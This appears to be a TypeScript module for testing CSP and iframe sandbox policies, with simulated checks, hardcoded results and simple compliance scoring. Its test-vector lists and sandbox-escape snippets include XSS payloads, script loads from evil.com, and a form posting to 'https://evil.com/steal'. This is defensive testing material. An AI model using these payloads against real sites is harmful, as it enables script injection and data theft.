/**
 * Phase 6.5: Content Security Policy (CSP) and Sandbox Security Policy Tester
 * 
 * Comprehensive testing framework for Content Security Policy enforcement,
 * sandbox escape detection, and security policy validation.
 */

export interface CSPDirective {
  name: string
  value: string[]
  enforced: boolean
}

export interface CSPPolicy {
  directives: CSPDirective[]
  reportOnly: boolean
  reportUri?: string
  nonce?: string
  hash?: string[]
}

export interface CSPViolation {
  directive: string
  blockedUri: string
  violatedDirective: string
  originalPolicy: string
  disposition: 'enforce' | 'report'
  statusCode: number
  lineNumber?: number
  columnNumber?: number
  sourceFile?: string
  timestamp: number
  riskLevel: 'critical' | 'high' | 'medium' | 'low'
  description: string
  mitigation: string
}

export interface SandboxPolicy {
  allowScripts: boolean
  allowSameOrigin: boolean
  allowForms: boolean
  allowPopups: boolean
  allowPointerLock: boolean
  allowOrientationLock: boolean
  allowPresentation: boolean
  allowTopNavigation: boolean
  allowModals: boolean
  customDirectives: string[]
}

export interface SandboxEscapeAttempt {
  id: string
  type: 'iframe_escape' | 'window_object' | 'dom_manipulation' | 'script_injection' | 'navigation_bypass'
  severity: 'critical' | 'high' | 'medium' | 'low'
  description: string
  exploitCode: string
  blocked: boolean
  detectionMethod: string
  timestamp: number
  mitigation: string[]
}

export interface SecurityPolicyTestResult {
  testId: string
  timestamp: number
  cspViolations: CSPViolation[]
  sandboxEscapeAttempts: SandboxEscapeAttempt[]
  policyEffectiveness: {
    cspScore: number // 0-100
    sandboxScore: number // 0-100
    overallScore: number // 0-100
  }
  recommendations: string[]
  complianceStatus: {
    owasp: boolean
    nistCsf: boolean
    iso27001: boolean
  }
}

export interface CSPTestConfig {
  strictMode: boolean
  enableReporting: boolean
  allowInlineScripts: boolean
  allowInlineStyles: boolean
  reportViolationsOnly: boolean
  customDirectives: Record<string, string[]>
  trustedDomains: string[]
}

export class CSPPolicyTester {
  private config: CSPTestConfig
  private violations: CSPViolation[] = []
  private escapeAttempts: SandboxEscapeAttempt[] = []
  private mockCSPReports: CSPViolation[] = []

  constructor(config: Partial<CSPTestConfig> = {}) {
    this.config = {
      strictMode: true,
      enableReporting: true,
      allowInlineScripts: false,
      allowInlineStyles: false,
      reportViolationsOnly: false,
      customDirectives: {},
      trustedDomains: ['self'],
      ...config
    }
  }

  /**
   * Test CSP policy effectiveness against various attack vectors
   */
  async testCSPPolicy(policy: CSPPolicy, testVectors: string[]): Promise<CSPViolation[]> {
    const violations: CSPViolation[] = []

    for (const vector of testVectors) {
      const violation = await this.evaluateCSPViolation(policy, vector)
      if (violation) {
        violations.push(violation)
      }
    }

    return violations
  }

  /**
   * Generate comprehensive CSP policy based on application requirements
   */
  generateCSPPolicy(options: {
    allowInlineScripts?: boolean
    allowInlineStyles?: boolean
    trustedScriptSources?: string[]
    trustedStyleSources?: string[]
    trustedImageSources?: string[]
    enableNonce?: boolean
    reportOnly?: boolean
  } = {}): CSPPolicy {
    const directives: CSPDirective[] = []

    // Default-src directive (fallback for all resource types)
    directives.push({
      name: 'default-src',
      value: ["'self'"],
      enforced: true
    })

    // Script-src directive
    const scriptSrc = ["'self'"]
    if (options.allowInlineScripts) {
      scriptSrc.push("'unsafe-inline'")
    }
    if (options.trustedScriptSources) {
      scriptSrc.push(...options.trustedScriptSources)
    }
    if (options.enableNonce) {
      scriptSrc.push("'nonce-{NONCE}'")
    }
    directives.push({
      name: 'script-src',
      value: scriptSrc,
      enforced: true
    })

    // Style-src directive
    const styleSrc = ["'self'"]
    if (options.allowInlineStyles) {
      styleSrc.push("'unsafe-inline'")
    }
    if (options.trustedStyleSources) {
      styleSrc.push(...options.trustedStyleSources)
    }
    directives.push({
      name: 'style-src',
      value: styleSrc,
      enforced: true
    })

    // Image-src directive
    const imgSrc = ["'self'", "data:", "https:"]
    if (options.trustedImageSources) {
      imgSrc.push(...options.trustedImageSources)
    }
    directives.push({
      name: 'img-src',
      value: imgSrc,
      enforced: true
    })

    // Additional security directives
    directives.push(
      {
        name: 'object-src',
        value: ["'none'"],
        enforced: true
      },
      {
        name: 'base-uri',
        value: ["'self'"],
        enforced: true
      },
      {
        name: 'form-action',
        value: ["'self'"],
        enforced: true
      },
      {
        name: 'frame-ancestors',
        value: ["'none'"],
        enforced: true
      },
      {
        name: 'upgrade-insecure-requests',
        value: [],
        enforced: true
      }
    )

    return {
      directives,
      reportOnly: options.reportOnly || false,
      reportUri: '/csp-report',
      nonce: options.enableNonce ? this.generateNonce() : undefined
    }
  }

  /**
   * Test sandbox policy effectiveness
   */
  async testSandboxPolicy(policy: SandboxPolicy): Promise<SandboxEscapeAttempt[]> {
    const escapeAttempts: SandboxEscapeAttempt[] = []

    // Test iframe escape attempts
    if (!policy.allowSameOrigin) {
      escapeAttempts.push(await this.testIframeEscape())
    }

    // Test script execution bypasses
    if (!policy.allowScripts) {
      escapeAttempts.push(await this.testScriptExecutionBypass())
    }

    // Test navigation bypasses
    if (!policy.allowTopNavigation) {
      escapeAttempts.push(await this.testNavigationBypass())
    }

    // Test form submission bypasses
    if (!policy.allowForms) {
      escapeAttempts.push(await this.testFormSubmissionBypass())
    }

    // Test popup bypasses
    if (!policy.allowPopups) {
      escapeAttempts.push(await this.testPopupBypass())
    }

    return escapeAttempts.filter(attempt => attempt !== null)
  }

  /**
   * Evaluate if a test vector violates CSP policy
   */
  private async evaluateCSPViolation(policy: CSPPolicy, testVector: string): Promise<CSPViolation | null> {
    // Simulate CSP evaluation logic
    const violations: { directive: string; reason: string; risk: 'critical' | 'high' | 'medium' | 'low' }[] = []

    // Check for inline script violations
    if (testVector.includes('<script>') && !this.allowsInlineScripts(policy)) {
      violations.push({
        directive: 'script-src',
        reason: 'Inline script execution blocked',
        risk: 'critical'
      })
    }

    // Check for unsafe-eval violations
    if (testVector.includes('eval(') && !this.allowsUnsafeEval(policy)) {
      violations.push({
        directive: 'script-src',
        reason: 'eval() execution blocked',
        risk: 'critical'
      })
    }

    // Check for external resource violations
    const externalSrcMatch = testVector.match(/src=["']([^"']+)["']/)
    if (externalSrcMatch && externalSrcMatch[1].includes('evil.com') && !this.allowsExternalResource(policy, externalSrcMatch[1])) {
      violations.push({
        directive: 'script-src',
        reason: 'External script from untrusted domain blocked',
        risk: 'high'
      })
    }

    // Check for style violations
    if (testVector.includes('style=') && !this.allowsInlineStyles(policy)) {
      violations.push({
        directive: 'style-src',
        reason: 'Inline style blocked',
        risk: 'medium'
      })
    }

    // Check for object/embed violations  
    if ((testVector.includes('<object') || testVector.includes('<embed')) && !this.allowsObjects(policy)) {
      violations.push({
        directive: 'object-src',
        reason: 'Object/embed element blocked',
        risk: 'high'
      })
    }

    if (violations.length === 0) return null

    const primaryViolation = violations[0]
    return {
      directive: primaryViolation.directive,
      blockedUri: this.extractUri(testVector) || 'inline',
      violatedDirective: primaryViolation.directive,
      originalPolicy: this.formatPolicy(policy),
      disposition: policy.reportOnly ? 'report' : 'enforce',
      statusCode: policy.reportOnly ? 200 : 0,
      timestamp: Date.now(),
      riskLevel: primaryViolation.risk,
      description: primaryViolation.reason,
      mitigation: this.generateCSPMitigation(primaryViolation.directive, primaryViolation.reason)
    }
  }

  /**
   * Test iframe escape attempts
   */
  private async testIframeEscape(): Promise<SandboxEscapeAttempt> {
    const exploitCode = `
      // Attempt to access parent window
      try {
        parent.location.href = 'https://evil.com';
      } catch(e) {
        // Blocked by sandbox
      }
    `

    return {
      id: `iframe_escape_${Date.now()}`,
      type: 'iframe_escape',
      severity: 'critical',
      description: 'Attempt to escape iframe sandbox and access parent window',
      exploitCode,
      blocked: true, // Assuming sandbox policy blocks this
      detectionMethod: 'Sandbox policy enforcement',
      timestamp: Date.now(),
      mitigation: [
        'Ensure sandbox="allow-scripts" is not set when same-origin access is not needed',
        'Use Content Security Policy frame-ancestors directive',
        'Validate all iframe sources and content'
      ]
    }
  }

  /**
   * Test script execution bypass attempts
   */
  private async testScriptExecutionBypass(): Promise<SandboxEscapeAttempt> {
    const exploitCode = `
      // Attempt to execute scripts in sandboxed context
      const script = document.createElement('script');
      script.innerHTML = 'alert("sandbox bypass")';
      document.head.appendChild(script);
    `

    return {
      id: `script_bypass_${Date.now()}`,
      type: 'script_injection',
      severity: 'critical',
      description: 'Attempt to bypass script execution restrictions in sandbox',
      exploitCode,
      blocked: true,
      detectionMethod: 'Sandbox script execution policy',
      timestamp: Date.now(),
      mitigation: [
        'Ensure sandbox does not include allow-scripts directive',
        'Use strict CSP script-src policy', 
        'Validate and sanitize all dynamic content'
      ]
    }
  }

  /**
   * Test navigation bypass attempts
   */
  private async testNavigationBypass(): Promise<SandboxEscapeAttempt> {
    const exploitCode = `
      // Attempt to navigate top-level window
      window.top.location = 'https://attacker.com';
    `

    return {
      id: `nav_bypass_${Date.now()}`,
      type: 'navigation_bypass',
      severity: 'high',
      description: 'Attempt to bypass top navigation restrictions',
      exploitCode,
      blocked: true,
      detectionMethod: 'Sandbox allow-top-navigation policy',
      timestamp: Date.now(),
      mitigation: [
        'Remove allow-top-navigation from sandbox directive',
        'Implement navigation validation on server side',
        'Use CSP navigation directives for additional protection'
      ]
    }
  }

  /**
   * Test form submission bypass attempts
   */
  private async testFormSubmissionBypass(): Promise<SandboxEscapeAttempt> {
    const exploitCode = `
      // Attempt to submit form to external domain
      const form = document.createElement('form');
      form.action = 'https://evil.com/steal';
      form.method = 'POST';
      document.body.appendChild(form);
      form.submit();
    `

    return {
      id: `form_bypass_${Date.now()}`,
      type: 'dom_manipulation',
      severity: 'medium',
      description: 'Attempt to bypass form submission restrictions',
      exploitCode,
      blocked: true,
      detectionMethod: 'Sandbox allow-forms policy',
      timestamp: Date.now(),
      mitigation: [
        'Remove allow-forms from sandbox directive if not needed',
        'Use CSP form-action directive to restrict form targets',
        'Validate all form submissions server-side'
      ]
    }
  }

  /**
   * Test popup bypass attempts
   */
  private async testPopupBypass(): Promise<SandboxEscapeAttempt> {
    const exploitCode = `
      // Attempt to open popup window
      window.open('https://evil.com', '_blank');
    `

    return {
      id: `popup_bypass_${Date.now()}`,
      type: 'window_object',
      severity: 'medium',
      description: 'Attempt to bypass popup restrictions',
      exploitCode,
      blocked: true,
      detectionMethod: 'Sandbox allow-popups policy',
      timestamp: Date.now(),
      mitigation: [
        'Remove allow-popups from sandbox directive',
        'Implement popup blocking at browser level',
        'Use user interaction requirements for popup creation'
      ]
    }
  }

  /**
   * Generate comprehensive security policy test
   */
  async performSecurityPolicyTest(
    cspPolicy: CSPPolicy,
    sandboxPolicy: SandboxPolicy,
    testVectors: string[]
  ): Promise<SecurityPolicyTestResult> {
    const testId = `security_test_${Date.now()}`
    const timestamp = Date.now()

    // Test CSP policy
    const cspViolations = await this.testCSPPolicy(cspPolicy, testVectors)

    // Test sandbox policy
    const sandboxEscapeAttempts = await this.testSandboxPolicy(sandboxPolicy)

    // Calculate effectiveness scores
    const policyEffectiveness = this.calculatePolicyEffectiveness(cspViolations, sandboxEscapeAttempts)

    // Generate recommendations
    const recommendations = this.generateSecurityRecommendations(cspViolations, sandboxEscapeAttempts)

    // Assess compliance
    const complianceStatus = this.assessComplianceStatus(cspPolicy, sandboxPolicy)

    return {
      testId,
      timestamp,
      cspViolations,
      sandboxEscapeAttempts,
      policyEffectiveness,
      recommendations,
      complianceStatus
    }
  }

  /**
   * Helper methods for CSP evaluation
   */
  private allowsInlineScripts(policy: CSPPolicy): boolean {
    const scriptSrc = policy.directives.find(d => d.name === 'script-src')
    return scriptSrc?.value.includes("'unsafe-inline'") || false
  }

  private allowsUnsafeEval(policy: CSPPolicy): boolean {
    const scriptSrc = policy.directives.find(d => d.name === 'script-src')
    return scriptSrc?.value.includes("'unsafe-eval'") || false
  }

  private allowsExternalResource(policy: CSPPolicy, uri: string): boolean {
    const scriptSrc = policy.directives.find(d => d.name === 'script-src')
    if (!scriptSrc) return false
    
    // Check if URI matches any allowed sources
    return scriptSrc.value.some(source => {
      if (source === "'self'") return false // Assuming external URI
      if (source.includes('*')) return true // Wildcard allows anything
      // Check if the source matches the domain
      const cleanSource = source.replace(/['"`]/g, '')
      return uri.includes(cleanSource)
    })
  }

  private allowsInlineStyles(policy: CSPPolicy): boolean {
    const styleSrc = policy.directives.find(d => d.name === 'style-src')
    return styleSrc?.value.includes("'unsafe-inline'") || false
  }

  private allowsObjects(policy: CSPPolicy): boolean {
    const objectSrc = policy.directives.find(d => d.name === 'object-src')
    if (!objectSrc) return true // No object-src directive means objects are allowed
    return !objectSrc.value.includes("'none'") && objectSrc.value.length > 0
  }

  private extractUri(testVector: string): string | null {
    const srcMatch = testVector.match(/src=["']([^"']+)["']/)
    const hrefMatch = testVector.match(/href=["']([^"']+)["']/)
    return srcMatch?.[1] || hrefMatch?.[1] || null
  }

  private formatPolicy(policy: CSPPolicy): string {
    return policy.directives
      .map(d => `${d.name} ${d.value.join(' ')}`)
      .join('; ')
  }

  private generateCSPMitigation(directive: string, reason: string): string {
    const mitigations: Record<string, string> = {
      'script-src': 'Update script-src directive to allow only trusted sources',
      'style-src': 'Update style-src directive to remove unsafe-inline',
      'object-src': 'Set object-src to none to prevent plugin execution',
      'img-src': 'Restrict image sources to trusted domains only'
    }
    return mitigations[directive] || 'Review and update CSP policy'
  }

  private calculatePolicyEffectiveness(
    cspViolations: CSPViolation[],
    escapeAttempts: SandboxEscapeAttempt[]
  ) {
    // Calculate CSP effectiveness (lower violations = higher score)
    const criticalCSP = cspViolations.filter(v => v.riskLevel === 'critical').length
    const highCSP = cspViolations.filter(v => v.riskLevel === 'high').length
    const cspScore = Math.max(0, 100 - (criticalCSP * 25 + highCSP * 10))

    // Calculate sandbox effectiveness (all attempts should be blocked)
    const unblockedAttempts = escapeAttempts.filter(a => !a.blocked).length
    const sandboxScore = Math.max(0, 100 - (unblockedAttempts * 50))

    // Overall security score
    const overallScore = Math.round((cspScore + sandboxScore) / 2)

    return { cspScore, sandboxScore, overallScore }
  }

  private generateSecurityRecommendations(
    cspViolations: CSPViolation[],
    escapeAttempts: SandboxEscapeAttempt[]
  ): string[] {
    const recommendations = new Set<string>()

    // CSP-based recommendations
    if (cspViolations.some(v => v.directive === 'script-src')) {
      recommendations.add('Implement strict script-src CSP directive with nonce or hash-based validation')
    }
    if (cspViolations.some(v => v.riskLevel === 'critical')) {
      recommendations.add('Address critical CSP violations immediately to prevent XSS attacks')
    }

    // Sandbox-based recommendations
    if (escapeAttempts.some(a => a.type === 'iframe_escape')) {
      recommendations.add('Review iframe sandbox attributes and remove unnecessary permissions')
    }
    if (escapeAttempts.some(a => a.severity === 'critical')) {
      recommendations.add('Implement additional sandbox restrictions for critical security boundaries')
    }

    // General recommendations
    recommendations.add('Regularly audit and update security policies')
    recommendations.add('Implement security policy violation monitoring and alerting')

    return Array.from(recommendations)
  }

  private assessComplianceStatus(cspPolicy: CSPPolicy, sandboxPolicy: SandboxPolicy) {
    // OWASP compliance check
    const hasStrictCSP = cspPolicy.directives.some(d => 
      d.name === 'script-src' && !d.value.includes("'unsafe-inline'")
    )
    const owasp = hasStrictCSP && !sandboxPolicy.allowScripts

    // NIST Cybersecurity Framework compliance
    const hasDefaultSrc = cspPolicy.directives.some(d => d.name === 'default-src')
    const nistCsf = hasDefaultSrc && hasStrictCSP

    // ISO 27001 compliance (basic security controls)
    const hasFrameAncestors = cspPolicy.directives.some(d => d.name === 'frame-ancestors')
    const iso27001 = hasFrameAncestors && !sandboxPolicy.allowSameOrigin

    return { owasp, nistCsf, iso27001 }
  }

  private generateNonce(): string {
    return btoa(Math.random().toString()).substr(0, 16)
  }
}

/**
 * Factory function for creating CSP policy tester
 */
export function createCSPPolicyTester(config?: Partial<CSPTestConfig>): CSPPolicyTester {
  return new CSPPolicyTester(config)
}

/**
 * Predefined test vectors for common attack patterns
 */
export const SecurityTestVectors = {
  xssAttacks: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror="alert(1)">',
    '<svg onload="alert(1)">',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(1)"></iframe>'
  ],
  
  cspBypasses: [
    '<script src="https://evil.com/malicious.js"></script>',
    '<style>@import url("https://evil.com/style.css");</style>',
    '<object data="https://evil.com/malware.swf"></object>',
    '<embed src="https://evil.com/plugin.pdf">'
  ],

  sandboxEscapes: [
    'parent.location.href = "https://evil.com"',
    'top.location = "https://attacker.com"',
    'window.open("https://malicious.com")',
    'document.forms[0].action = "https://evil.com"'
  ],

  injectionAttacks: [
    'eval("malicious code")',
    'new Function("return evil()")()',
    'setTimeout("alert(1)", 100)',
    'setInterval("malicious()", 1000)'
  ]
} as const

/**
 * Predefined CSP policy templates
 */
export const CSPPolicyTemplates = {
  strict: {
    directives: [
      { name: 'default-src', value: ["'self'"], enforced: true },
      { name: 'script-src', value: ["'self'", "'nonce-{NONCE}'"], enforced: true },
      { name: 'style-src', value: ["'self'", "'nonce-{NONCE}'"], enforced: true },
      { name: 'img-src', value: ["'self'", "data:", "https:"], enforced: true },
      { name: 'object-src', value: ["'none'"], enforced: true },
      { name: 'base-uri', value: ["'self'"], enforced: true },
      { name: 'form-action', value: ["'self'"], enforced: true },
      { name: 'frame-ancestors', value: ["'none'"], enforced: true }
    ],
    reportOnly: false
  },

  moderate: {
    directives: [
      { name: 'default-src', value: ["'self'"], enforced: true },
      { name: 'script-src', value: ["'self'", "'unsafe-inline'"], enforced: true },
      { name: 'style-src', value: ["'self'", "'unsafe-inline'"], enforced: true },
      { name: 'img-src', value: ["'self'", "data:", "https:"], enforced: true },
      { name: 'object-src', value: ["'none'"], enforced: true }
    ],
    reportOnly: false
  },

  development: {
    directives: [
      { name: 'default-src', value: ["'self'", "'unsafe-inline'", "'unsafe-eval'"], enforced: true }
    ],
    reportOnly: true
  }
} as const